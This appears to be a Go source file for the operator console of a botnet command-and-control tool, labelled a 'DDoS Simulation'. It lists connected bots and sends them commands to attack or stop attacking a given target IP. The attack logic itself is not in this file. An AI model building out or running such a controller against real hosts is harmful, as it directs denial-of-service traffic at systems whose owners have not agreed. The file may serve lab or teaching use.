package c2

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

func NewCLI(m *Master) *cobra.Command {
	var rootCmd = &cobra.Command{
		Use:   "c2",
		Short: "DDoS Simulation: C2 (Command and Control) CLI",
	}

	var listBotsCmd = &cobra.Command{
		Use:   "list",
		Short: "List connected bots",
		RunE: func(cmd *cobra.Command, args []string) error {
			return m.list()
		},
	}

	var broadcastCmd = &cobra.Command{
		Use:   "broadcast <payload>",
		Short: "Broadcast a target IP to all connected bots",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			return m.broadcast(args[0])
		},
	}

	var attackCmd = &cobra.Command{
		Use:   "attack <target_ip>",
		Short: "Sends an attack signal to all connected bots pointing to that target IP",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			return m.attack(args[0])
		},
	}

	var stopCmd = &cobra.Command{
		Use:   "stop",
		Short: "Sends a stop signal to all connected bots",
		RunE: func(cmd *cobra.Command, args []string) error {
			return m.stop()
		},
	}

	rootCmd.AddCommand(listBotsCmd, broadcastCmd, attackCmd, stopCmd)
	return rootCmd
}

func RunCLI(m *Master) error {
	rootCmd := NewCLI(m)

	fmt.Println(`
$$$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  
$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
$$ |  $$ |$$ |  $$ |$$ /  $$ |$$ /  \__|
$$ |  $$ |$$ |  $$ |$$ |  $$ |\$$$$$$\  
$$ |  $$ |$$ |  $$ |$$ |  $$ | \____$$\ 
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$\   $$ |
$$$$$$$  |$$$$$$$  | $$$$$$  |\$$$$$$  |
\_______/ \_______/  \______/  \______/ 
	`)

	fmt.Println("DDoS Simulation: C2 (Command and Control) CLI")
	fmt.Println("Type 'help' for available commands.\n")

	// Interactive Console
	time.Sleep(50 * time.Millisecond) // Again for my OCD

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("\nc2 # ")
		input, err := reader.ReadString('\n')
		if err != nil {
			return err
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		if input == "exit" || input == "quit" {
			fmt.Println("Exiting...")
			return nil
		}

		if input == "help" {
			rootCmd.SetArgs([]string{"--help"})
			if err := rootCmd.Execute(); err != nil {
				fmt.Printf("error: %v\n", err)
			}

			continue
		}

		// Hands off to Cobra
		args := strings.Fields(input)
		rootCmd.SetArgs(args)
		if err := rootCmd.Execute(); err != nil {
			fmt.Printf("error: %v\n", err)
		}
	}
}
